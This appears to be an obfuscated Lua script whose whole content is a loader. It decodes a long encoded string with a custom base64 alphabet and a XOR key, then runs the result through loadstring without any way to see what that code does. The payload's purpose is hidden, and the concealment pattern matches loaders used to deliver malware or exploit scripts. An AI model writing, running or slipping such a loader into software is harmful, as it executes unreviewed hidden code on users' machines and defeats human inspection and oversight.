return(function(...)
local _oyls2d0qf=76
local _fmw69kj8c=36*_oyls2d0qf
local _c0lx214ns="tUj/bvJuQACw0YBZi1TIG5rOhckNsW9q8H4+fLyVn7xgz23RmSadolXPF6eEpDKM"
local _mz3csc92d={100,3,11,30,17,102,231,55,26,254,196,218,154,189,251,86}
local _j3d57un4u="tXWD9VtYLS8EXcxiSZ9m/T2uTfHOGpmtQQBE2ZwIH4bLGb2hO/9a0+4m4FO1DNzZqUzO9yt1yGD2+CJoD0dL5t18QTfHGDACqc+xKCrIXy2iq/n4CUdibj3Qe9Tf407yNSvJIbtP2XLC77KJd3JH/TcjTl5IQNF+0WjAocjHPJ9ga9IbpN0VSp7/JIfLqjBEmZq+EgkDUDNmb1fiYliy8RISa0xjfSOdK/5kuu0Hu0aBH2I+aAGdF98wTb0zcajWme9VxMXC/EeWcGYiJ4DPaMrNL6KC6XwtMmWLjXctUkVqmCesHKAzzWAXiv5ruOIWFcaWyQRo06PjBH65v/58HrF4CIolB0YdsF9V7qq9yVf6qO2oAaE1uTCIgwI++BD7ctQAcHsU2JA5n7a9L2JEuO1oTl1iQNF4qKq/mWwaztmQTJLDWiZeGHNvEMk6V75k5ImPCjLqP8FgHsBHKp/19Pbu1OW5QevmCNO2P7yEMULluUlYCugDCm3LFFuNFZvNf99/FAKbU0Ilb4tVZHLNLERtl0dAg/ZHoTQUbfl7C6gfVFVJRpfpy2GaJHcIq4Z1McdPFR99b0dDt/z8WvYLlQT6mMPl8mJgpJ1RqaQ1b3xG8NrngY1cm7puQababL/zxB+APWr+rRCShL6hbVWyysBNLFxrzGd8PaWCGS0LCkYbQ4fDIfJXrrkG7RNLfwsgJPlowlHIdtUXLk3fxxgvkrijsHD4QgWliweCL0Ta4vL7bflqG/NNqT4dV6wYgghc1IGVWIYrdS0yP3uMM2yMN5GH0y0XiDtOwQMFDC4/orUg/bvGqXM301NfXzBqRRQ1sS0GjvDN6IiTmYR5d3w2Oc/aKx9edt/tKlf4AuWjJwkJRZqnpWmOa9Fjwr6mvbxLxpZYX09mNxkw08m5t4soyE9/4s3sF+Iyf4cCGfsdQD3TDqPg66biPg6jNdYeUbqzoqRm69a65Qey/Hiw08vrFxx54ATUxd/6KUljOHsoczPyy69Cdq1mghsDWLGT0bw0bjngWrbOfG0nXBJHDpBUZUAgYXSltDFh5DkI2BOylrhXilFquJg7BI4a8Arq"
local _p5df9hocz={}
for _eo4nz1f8s=1,#_c0lx214ns do _p5df9hocz[string.byte(_c0lx214ns,_eo4nz1f8s)]=_eo4nz1f8s-1 end
local _br8z191bz={}
local _zhzv0iqrt,_p456zbzlp,_z91nwphha=0,0,0
for _eo4nz1f8s=1,#_j3d57un4u do
local _lds5sdb1k=string.byte(_j3d57un4u,_eo4nz1f8s)
local _s3upiofft=_p5df9hocz[_lds5sdb1k]
if _s3upiofft then
_zhzv0iqrt=_zhzv0iqrt*64+_s3upiofft
_p456zbzlp=_p456zbzlp+6
if _p456zbzlp>=8 then
_p456zbzlp=_p456zbzlp-8
local _jdjeoga1a=math.floor(_zhzv0iqrt/(2^_p456zbzlp))%256
_zhzv0iqrt=_zhzv0iqrt%(2^_p456zbzlp)
local _jwepaxm4f=_mz3csc92d[(_z91nwphha%#_mz3csc92d)+1]
_jdjeoga1a=bit32.bxor(_jdjeoga1a,_jwepaxm4f)
_jdjeoga1a=bit32.bxor(_jdjeoga1a,_z91nwphha%256)
_br8z191bz[#_br8z191bz+1]=string.char(_jdjeoga1a)
_z91nwphha=_z91nwphha+1
end
end
end
local _ek8ccj5d0=table.concat(_br8z191bz)
local _f8nzi6jp6=loadstring or load
local _u6dn63jfj=_f8nzi6jp6(_ek8ccj5d0)
if _u6dn63jfj then return _u6dn63jfj(...) end
end)(...)